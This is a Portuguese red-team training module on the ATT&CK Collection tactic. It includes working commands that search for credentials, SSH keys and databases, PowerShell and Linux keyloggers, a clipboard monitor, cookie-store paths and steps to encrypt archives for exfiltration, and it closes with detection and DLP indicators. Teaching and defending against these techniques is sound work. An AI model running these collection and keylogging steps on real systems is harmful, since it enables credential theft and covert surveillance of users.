# 11 - Coleta

**MITRE ATT&CK Tactic:** [TA0009 - Collection](https://attack.mitre.org/tactics/TA0009/)

## 📖 Sobre

Técnicas para **coletar informações de interesse** do alvo antes da exfiltração. Reunir dados sensíveis, documentos, emails, screenshots, etc.

## 🎯 Objetivo

Identificar e coletar dados de valor: credenciais, propriedade intelectual, PII, dados financeiros, emails, etc.

## 📚 Técnicas Principais

### T1560 - Archive Collected Data
- **T1560.001** - Archive via Utility (zip, tar, rar)
- **T1560.002** - Archive via Library
- **T1560.003** - Archive via Custom Method
- Compactar dados para exfiltração

### T1123 - Audio Capture
- Gravar áudio do microfone
- Interceptar chamadas VoIP

### T1119 - Automated Collection
- Scripts de coleta automática
- Harvesting de dados

### T1185 - Browser Session Hijacking
- Roubar sessões ativas
- Session cookies

### T1115 - Clipboard Data
- Capturar clipboard
- Monitorar ctrl+c/ctrl+v

### T1530 - Data from Cloud Storage
- Acessar cloud storage (S3, OneDrive, GDrive)
- Download de backups cloud

### T1602 - Data from Configuration Repository
- **T1602.001** - SNMP (MIB Dump)
- **T1602.002** - Network Device Configuration Dump
- Configs de routers, switches

### T1213 - Data from Information Repositories
- **T1213.001** - Confluence
- **T213.002** - SharePoint
- **T1213.003** - Code Repositories
- Wikis internos, documentação

### T1005 - Data from Local System
- Arquivos locais
- Databases locais
- Documentos do usuário

### T1039 - Data from Network Shared Drive
- Network shares
- NAS/SAN

### T1025 - Data from Removable Media
- USB drives
- External HDDs

### T1074 - Data Staged
- **T1074.001** - Local Data Staging
- **T1074.002** - Remote Data Staging
- Preparar dados para exfiltração

### T1114 - Email Collection
- **T1114.001** - Local Email Collection
- **T1114.002** - Remote Email Collection
- **T1114.003** - Email Forwarding Rule

### T1056 - Input Capture
- **T1056.001** - Keylogging
- **T1056.002** - GUI Input Capture

### T1113 - Screen Capture
- Screenshots
- Screen recording

### T1125 - Video Capture
- Webcam capture
- Screen recording

## 🛠️ Técnicas de Coleta

### File Collection

#### Procurar Arquivos Sensíveis - Windows
```powershell
# Documentos
Get-ChildItem -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue

# Credenciais
Get-ChildItem -Path C:\ -Include *password*,*credential*,*secret* -Recurse -ErrorAction SilentlyContinue

# Databases
Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql,*.mdb -Recurse -ErrorAction SilentlyContinue

# Config files
Get-ChildItem -Path C:\ -Include *.config,*.conf,*.ini -Recurse -ErrorAction SilentlyContinue

# SSH/VPN keys
Get-ChildItem -Path C:\ -Include id_rsa,*.pem,*.ppk,*.ovpn -Recurse -ErrorAction SilentlyContinue
```

#### Procurar Arquivos Sensíveis - Linux
```bash
# Documentos
find / -type f \( -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" \) 2>/dev/null

# Credenciais
find / -type f \( -name "*password*" -o -name "*credential*" -o -name "*secret*" \) 2>/dev/null

# Databases
find / -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sql" \) 2>/dev/null

# Config files
find /etc -type f -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
```

### Email Collection

#### Outlook (Windows)
```powershell
# PST files location
Get-ChildItem -Path C:\ -Include *.pst,*.ost -Recurse -ErrorAction SilentlyContinue

# Export emails via PowerShell
# Requires Outlook installed
Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
```

#### Thunderbird
```bash
# Linux/Windows profile location
~/.thunderbird/
%APPDATA%\Thunderbird\Profiles\

# Mail files
find ~/.thunderbird/ -name "*.mbox"
```

#### Web Email
```bash
# Session cookies (requires valid session)
# Chrome cookies: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Firefox cookies: %APPDATA%\Mozilla\Firefox\Profiles\*.default\cookies.sqlite
```

### Database Collection
```bash
# MySQL dump
mysqldump -u user -p database > backup.sql

# PostgreSQL dump
pg_dump -U user database > backup.sql

# SQLite
sqlite3 database.db .dump > backup.sql

# MongoDB
mongodump --db database --out /backup/
```

### Cloud Storage
```bash
# AWS S3
aws s3 sync s3://bucket-name /local/path

# Azure Blob
az storage blob download-batch --source container --destination /local/path

# Google Cloud
gsutil -m cp -r gs://bucket-name /local/path
```

### Screen Capture

#### Windows
```powershell
# PowerShell screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("C:\screenshot.png")
```

#### Linux
```bash
# Screenshot
scrot screenshot.png
import -window root screenshot.png

# Screen recording
ffmpeg -video_size 1920x1080 -framerate 25 -f x11grab -i :0.0 output.mp4
```

### Keylogging

#### Windows
```powershell
# PowerShell simple keylogger
$path = "C:\keylog.txt"
while ($true) {
    Start-Sleep -Milliseconds 100
    $key = [Console]::ReadKey($true)
    Add-Content -Path $path -Value $key.KeyChar
}
```

#### Linux
```bash
# xinput keylogger
xinput list
xinput test <device-id> >> keylog.txt

# Using logkeys
logkeys --start --output /tmp/keylog.txt
```

### Clipboard Capture

#### Windows
```powershell
# PowerShell clipboard monitor
while ($true) {
    $clip = Get-Clipboard -Raw
    if ($clip) {
        Add-Content -Path "C:\clipboard.txt" -Value "$(Get-Date): $clip"
    }
    Start-Sleep -Seconds 5
}
```

#### Linux
```bash
# xclip clipboard monitor
while true; do
    xclip -o -selection clipboard >> clipboard.txt
    sleep 5
done
```

### Archive Data for Exfiltration
```bash
# Windows - Compress with password
Compress-Archive -Path C:\sensitive\ -DestinationPath C:\data.zip

# 7zip with password
7z a -pPASSWORD data.7z C:\sensitive\

# Linux - tar.gz
tar -czf data.tar.gz /path/to/data/

# tar with encryption
tar -czf - /path/to/data/ | openssl enc -aes-256-cbc -salt -out data.tar.gz.enc

# zip with password
zip -r -P PASSWORD data.zip /path/to/data/
```

## 🎓 Labs Práticos

- [ ] Procurar e coletar documentos sensíveis
- [ ] Dump de database local
- [ ] Screenshot automation
- [ ] Simple keylogger (ambiente controlado)
- [ ] Clipboard monitoring
- [ ] Email collection (PST extraction)
- [ ] Archive and encrypt data
- [ ] Browser session/cookie theft

## 🛠️ Ferramentas de Coleta

### File Collection
- **Everything** (Windows) - Fast file search
- **FileZilla** - FTP client para transferências
- **WinSCP** - SFTP/SCP client

### Email
- **MailSniper** - O365/Exchange enumeration
- **Ruler** - Exchange exploitation
- **PST export tools**

### Screen/Input Capture
- **meterpreter** - screenshot, webcam_snap, keyscan_start
- **Empire** - Get-Screenshot, Get-Keystrokes
- **Cobalt Strike** - screenshot, keylogger

### Database
- **sqldump** - MySQL/MariaDB
- **pg_dump** - PostgreSQL
- **mongodump** - MongoDB
- **DBeaver** - Universal database tool

### Cloud
- **aws-cli** - AWS operations
- **az-cli** - Azure operations
- **gcloud** - Google Cloud operations
- **rclone** - Multi-cloud sync

## 📝 Tipos de Dados de Interesse

### Credentials
```
- Senhas em texto claro
- Hashes
- Private keys (SSH, SSL)
- API keys, tokens
- Database credentials
- VPN configs
```

### Documents
```
- Contratos
- Propriedade intelectual
- Planos de negócio
- Documentos financeiros
- Dados de clientes (PII)
```

### Technical
```
- Source code
- Database backups
- Network diagrams
- System documentation
- Configuration files
```

### Communications
```
- Emails
- Chat logs (Teams, Slack)
- Meeting recordings
- Internal wikis
```

## 🔍 Detecção

### Indicadores
- Acessos incomuns a shares de rede
- Downloads em massa
- Compressão de grandes volumes de dados
- Cópias para removable media
- Acesso a databases fora do horário
- Múltiplos acessos a documentos sensíveis
- Screen capture tools executando

### DLP (Data Loss Prevention)
- Monitorar transferências de arquivos
- Detectar dados sensíveis sendo copiados
- Alertas em acessos anormais
- Classificação de dados

## 📚 Recursos

- [MITRE ATT&CK - Collection](https://attack.mitre.org/tactics/TA0009/)
- [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)
- [PayloadsAllTheThings - File Transfer](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)

---

**Anterior:** [10-MovLateral](../10-MovLateral/) | **Próximo:** [12-ComandoControle](../12-ComandoControle/)